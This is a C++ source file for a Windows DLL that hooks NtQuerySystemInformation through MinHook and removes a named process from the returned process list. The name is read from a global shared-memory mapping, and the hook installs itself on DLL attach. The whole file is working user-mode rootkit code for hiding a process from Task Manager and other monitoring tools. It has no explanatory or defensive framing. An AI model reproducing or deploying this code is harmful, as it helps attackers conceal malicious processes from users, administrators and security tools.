#include <Windows.h>
#include "MinHook.h"
#include "nt_structs.h"

#pragma comment(lib, "libMinHook.x64.lib")

PNT_QUERY_SYSTEM_INFORMATION Original_NtQuerySystemInformation;
PNT_QUERY_SYSTEM_INFORMATION New_NtQuerySystemInformation;
wchar_t* process;

NTSTATUS WINAPI Hooked_NtQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass, //Вид системной информации для извлечения.
	PVOID SystemInformation,						 
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS stat = New_NtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);

	if (SystemProcessInformation == SystemInformationClass && stat == 0)
	{
		P_SYSTEM_PROCESS_INFORMATION prev = P_SYSTEM_PROCESS_INFORMATION(SystemInformation);
		P_SYSTEM_PROCESS_INFORMATION curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)prev + prev->NextEntryOffset);

		while (prev->NextEntryOffset != NULL) {
			if (!lstrcmp(curr->ImageName.Buffer, process)) {
				if (curr->NextEntryOffset == 0) {
					prev->NextEntryOffset = 0;
				}
				else {
					prev->NextEntryOffset += curr->NextEntryOffset;
				}
				curr = prev;
			}
			prev = curr;
			curr = P_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
		}
	}

	return stat;
}

bool setNtHook()
{
	HMODULE ntdll = GetModuleHandle(L"ntdll.dll");

	Original_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");

	if (MH_Initialize() != MH_OK) { return false; }

	if (MH_CreateHook(Original_NtQuerySystemInformation, &Hooked_NtQuerySystemInformation,
		(LPVOID*)&New_NtQuerySystemInformation) != MH_OK) {
		return false;
	}

	if (MH_EnableHook(Original_NtQuerySystemInformation) != MH_OK) { return false; }

	return true;
}

void getProcessName() {
	HANDLE map = OpenFileMappingA(
		FILE_MAP_ALL_ACCESS,
		FALSE,
		"Global\\GetProcessName"
	);

	LPVOID buf = MapViewOfFile(map,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		255);

	process = (wchar_t*)malloc(255 * sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, (char*)buf, -1, process, 255);

	UnmapViewOfFile(buf);
	CloseHandle(map);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		if (!setNtHook()) {
			return FALSE;
		}
		getProcessName();
		break;
	case DLL_PROCESS_DETACH:
		MH_DisableHook(Original_NtQuerySystemInformation);
		MH_Uninitialize();
		break;
	}

	return TRUE;
}